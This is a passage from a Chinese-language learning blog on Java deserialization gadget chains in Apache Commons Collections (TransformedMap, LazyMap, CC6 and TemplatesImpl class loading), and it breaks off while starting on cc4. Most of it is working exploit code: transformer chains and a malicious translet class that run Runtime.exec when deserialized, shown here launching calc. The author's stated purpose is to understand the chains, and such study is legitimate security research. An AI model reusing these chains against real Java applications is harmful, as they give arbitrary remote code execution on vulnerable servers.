&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>因为Runtime类不能序列化,所以需要将其改装为能够序列化,而Class是可以序列化的</p>
<p><strong>在invoke的时候,如果是静态方法,第一个参数可以为Null</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;Runtime&gt; runtimeClass = Runtime.class;</span><br><span class="line">        Method getRuntime = runtimeClass.getMethod(<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        Object o = (Runtime)getRuntime.invoke(<span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">        Method exec = runtimeClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        exec.invoke(o,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>继续将其改装为<code>InvokerTransformer</code>中<code>transform</code>方法的版本</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">                </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//逐步改装</span></span><br><span class="line"><span class="comment">//调用getMethod方法获取getRuntime方法</span></span><br><span class="line">        Object getRuntimeMethod = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;).transform(Runtime.class);</span><br><span class="line">        <span class="comment">//如法炮制,调用invoke方法,获取runtime对象</span></span><br><span class="line">        Object runtime = (Runtime)<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;).transform(getRuntimeMethod);</span><br><span class="line">        <span class="comment">//调用runtime中的exec方法执行命令</span></span><br><span class="line">        Object res = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(runtime);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里有个疑问,为什么第一句里面传入的是class而不是对象,但是却可以调用其中的方法?</p>
<p>回到前面的问题,因为Runtime.getRuntime()方法时静态方法,所以传递的第一个参数可以为null,也就是说第一个参数对于invoke没有什么影响??</p>
<p>上面的代码可以通过ChainedTransformer再次缩短</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对于里面的函数会进行递归调用,上一个的执行结果会变成下一个的参数传进去,最后返回最终结果</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">            object = iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers= <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">new</span> ChainedTransformer(transformers).transform(Runtime.class);</span><br></pre></td></tr></table></figure>

<h5 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers= <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer Chainedtransform = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> HashMap&lt;Object, Object&gt;() ;</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="keyword">null</span>, Chainedtransform);</span><br><span class="line">        Class&lt;?&gt; c = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object o = declaredConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line">        SerializeTest.serialize(o);</span><br><span class="line">        UnSerializeTest.unserialize(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>);</span><br></pre></td></tr></table></figure>





<h4 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h4><p>lazyMap中的<code>get</code>方法也调用了<code>transform</code>方法,可以使用其替代<code>TransformedMap.checkSetValue</code></p>
<p>分析一下lazyMap中的<code>get</code>方法的使用</p>
<p>LazyMap顾名思义,就是在创建map的时候不创建key,再get的时候才创建key,并且LazyMap是public的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">new</span> LazyMap(map, factory);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>使用上述”构造方法”创建LazyMap,接着先调用get试试,分析其只有没有key的map才能进入if循环中调用<code>transform</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="keyword">false</span>) &#123;</span><br><span class="line">            Object value = factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers= <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer Chainedtransform = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> HashMap&lt;Object, Object&gt;() ;</span><br><span class="line">        map.put(<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">     </span><br><span class="line">        Map lazyMap = LazyMap.decorate(map, Chainedtransform);</span><br><span class="line">        lazyMap.get(Chainedtransform);</span><br></pre></td></tr></table></figure>

<p>为什么map添加了键值对,还能成功进入<code>if</code>循环</p>
<p>找到<code>containsKey</code>方法的解释是<code>map中的containsKey（key）方法是判断该key在map中是否有key存在。如果存在则返回true。如果不存在则返回false</code>换言之,其判断的是map里面是key是不是在map中存在,而运行时key显然不存在,所以便调用了key的<code>transform方法</code></p>
<p>接下来找能调用<code>get</code>方法的类</p>
<p>还得是<code>AnnotationInvocationHandler</code>类</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220312160852089.png" alt="image-20220312160852089"></p>
<p>readObject中的memberTypes是注解的成员变量,无法控制</p>
<p>在该类的<code>invoke</code>方法中有一个get方法的调用</p>
<p>这个类实现了<code>InvocationHandler</code>接口,根据之前学习的java动态代理的使用,只要有它的代理调用了该类中的任何方法,都会调用invoke从而走到调用<code>get</code></p>
<blockquote>
<p>如何在<code>Object result = memberValues.get(member);</code>中将member改为<code>ChainedTransformer</code></p>
</blockquote>
<p>这里其实是我的理解出了问题,经过多次调试,只要通过动态代理调用<code>AnnotationInvocationHandler</code>中的方法,就能执行代码,并且传入到LazyMap中的key参数虽然跟着变化,但是还能执行</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220313155923303.png" alt="image-20220313155923303"></p>
<p>最后找到了原因,因为上一cc链中为了不让AnnotationInvocationHandler改变第一个Transformer中的值,使用了new ConstantTransformer(Runtime.class)在链式调用的时候给下一个Transformer传递值,如果保持这一修改不变,不管外部调用transform方法传递进来的参数是什么,都会被修改为Runtime.class从而执行下去</p>
<blockquote>
<p>得到的教训,遇到不懂的代码要多耐心调试,跟着代码走下去,不要妄想一下就能看明白</p>
</blockquote>
<h4 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h4><p>这条链使用了TiedMapEntry.hashCode中对于getValue的调用而调用的get方法</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220313175136879.png" alt="image-20220313175136879"></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220313175144689.png" alt="image-20220313175144689"></p>
<p>这里调用get传递的参数是key,所以还是使用<code>new ConstantTransformer(Runtime.class)</code>修改传递进去的参数即可,所以实例化的时候key随便传递一个就行了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="string">&quot;sssfs&quot;</span>);</span><br><span class="line">        <span class="comment">//接着调用它的hashCode方法</span></span><br><span class="line">        tiedMapEntry.hashCode();</span><br></pre></td></tr></table></figure>

<p>成功执行</p>
<p>接下来利用HashMap反序列化的时候会计算key的hashCode从而调用它的hashCode方法</p>
<p>这条链类似于URLDNS那条链的原理,URLDNS中put调用hashCode会消耗掉它为-1的hashCode,这条链呢则会在put的时候调用hashCode方法,到lazyMap的get方法的时候,会给它添加一个key,导致反序列化的时候已经存在了这个key,导致进不了if循环从而无法调用transform方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="keyword">false</span>) &#123;</span><br><span class="line">            Object value = factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>所以可以通过remove移除添加进去的key</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers= <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer Chainedtransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> HashMap&lt;Object, Object&gt;() ;</span><br><span class="line">        </span><br><span class="line">		<span class="comment">//这里随便传递一个Transformer是为了不在put的时候执行,put完再把ChainedTransformer添加回去</span></span><br><span class="line">        Map lazyMap = LazyMap.decorate(map, <span class="keyword">new</span> ConstantTransformer(<span class="number">123</span>));</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,String&gt; map1=<span class="keyword">new</span> HashMap();</span><br><span class="line">        Class&lt;? extends Map&gt; lazyMapClass = lazyMap.getClass();</span><br><span class="line">        Field factory = lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        map.put(tiedMapEntry,<span class="string">&quot;ddd&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        factory.set(lazyMap,Chainedtransformer);</span><br><span class="line">        SerializeTest.serialize(map);</span><br><span class="line">        UnSerializeTest.unserialize(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>注:在学习构造shiro的cc链的时候,shiro中TiedMapEntry第二个参数必须是要transform(key)的key,为什么这里可以乱传递一个呢,因为不管传递的是啥,只要ChainedTransformer开始transform,执行到<code>new ConstantTransformer(Runtime.class)</code>,就会被改成<code>Runtime.class</code></p>
<h3 id="动态类加载"><a href="#动态类加载" class="headerlink" title="动态类加载"></a>动态类加载</h3><p>ClassLoader中有一个defineClass方法,该方法可以从字节码文件加载类,如果能找到一个类既调用了defineClass方法又对类进行了实例化,那么就可以执行类中的静态代码块</p>
<p>ClassLoader中有好多defineClass方法,挨个findUsages,找到一个defineClass在其他包内不是private的调用</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220314151530097.png" alt="image-20220314151530097"></p>
<p>接着找,找到一个方法能进行实例化</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220314152458340.png" alt="image-20220314152458340"></p>
<p>在newTransformer这个public方法中调用了它,所以入口找到了,思路就是通过newTransformer</p>
<p>加载完成之后_class数组存储的就是通过字节码加载进来的类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//H:\java\classTest\MyClass</span></span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();</span><br><span class="line">        Field name = templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytecodes = templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;H:\\java\\classTest\\MyClass.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*Field transletIndex = templatesClass.getDeclaredField(&quot;_transletIndex&quot;);</span></span><br><span class="line"><span class="comment">        transletIndex.setAccessible(true);</span></span><br><span class="line"><span class="comment">        transletIndex.set(templates,0);*/</span></span><br><span class="line">    	<span class="comment">//这块是想多了,后面判断父类是不是指定的类的时候会对_transletIndex变量做出修改,现在改了也没用</span></span><br><span class="line"></span><br><span class="line">        Field tfactory = templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        templates.newTransformer();</span><br></pre></td></tr></table></figure>

<p>大部分都很容易理解,就是后面有一个空指针异常的地方,会判断加载的class是不是继承了<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String ABSTRACT_TRANSLET</span><br><span class="line">    = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220314160724089.png" alt="image-20220314160724089"></p>
<p>所以给要加载的类继承该类就行了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> <span class="keyword">extends</span> <span class="title">com</span>.<span class="title">sun</span>.<span class="title">org</span>.<span class="title">apache</span>.<span class="title">xalan</span>.<span class="title">internal</span>.<span class="title">xsltc</span>.<span class="title">runtime</span>.<span class="title">AbstractTranslet</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Process calc = Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过这个就多了一种代码执行的方法,在ChainedTransformer中通过<code>transform</code>调用<code>newTransformer()</code>方法从而加载指定类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        </span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();</span><br><span class="line">        Field name = templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytecodes = templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;H:\\java\\classTest\\MyClass.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field tfactory = templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*templates.newTransformer();*/</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="comment">//ConstantTransformer.transforme如什么对象就返回什么对象,刚好在链式调用里面做开头参数</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(templates),</span><br><span class="line"></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">null</span>,<span class="keyword">null</span>),</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer Chainedtransform = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> HashMap&lt;Object, Object&gt;() ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(map, <span class="keyword">new</span> ConstantTransformer(<span class="number">123</span>));</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,String&gt; map1=<span class="keyword">new</span> HashMap();</span><br><span class="line">        Class&lt;? extends Map&gt; lazyMapClass = lazyMap.getClass();</span><br><span class="line">        Field factory = lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        map.put(tiedMapEntry,<span class="string">&quot;ddd&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        factory.set(lazyMap,Chainedtransform);</span><br><span class="line">        <span class="comment">/*SerializeTest.serialize(map);*/</span></span><br><span class="line">        UnSerializeTest.unserialize(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>所以说在这条链里面,最重要的还是前面的transformer方法导致的任意类方法调用</p>
<p>再往上找,找到一个叫<code>TrAXFilter</code>的类的构造方法中调用了newTransformer,但是这个类是不可序列化的,所以需要改装,比如说找一个类中的<code>transform</code>方法,这个方法可以调用传入的对象的构造方法</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220314173150015.png" alt="image-20220314173150015"></p>
<p>还真有一个这样的类<code>InstantiateTransformer</code>并且它是可以序列化的,它的<code>transform</code>方法调用是Class子类的构造方法</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220314175651000.png" alt="image-20220314175651000"></p>
<p>对代码稍作修改,就可以实现和InvokeTransformer相同的效果了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers= <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">        <span class="comment">//ConstantTransformer.transformer传什么对象就返回什么对象,刚好在链式调用里面做开头参数</span></span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="keyword">new</span> Object[]&#123;templates&#125;)</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="cc4"><a href="#cc4" class="headerlink" title="cc4"></a>cc4</h3><p><strong>commons-collections4.0中的</strong></p>
<p>首先根据<code>transform</code>方法找调用<code>transform</code>方法的类,找到一个<code>TransformingComparator</code>类,并且该类实现了<code>serializeable</code>接口可序列化,它里面的<code>compare</code>方法调用了<code>transfom</code>方法</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220315233629253.png" alt="image-20220315233629253"></p>
<p>接着找一个类的<code>readObject</code>方法调用compare方法</p>
<p>有一个<code>PriorityQueue</code>类</p>
<p>根据调用链先尝试序列化,报错</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220316001101815.png" alt="image-20220316001101815"></p>
<p>找到原因是<code>InstantiateTransformer</code>类在commons-collection4.4版本中取消了对Serializeable接口的继承,让其无法反序列化</p>
<p>还是先把cc版本切换为4.0跟着复现把…..</p>
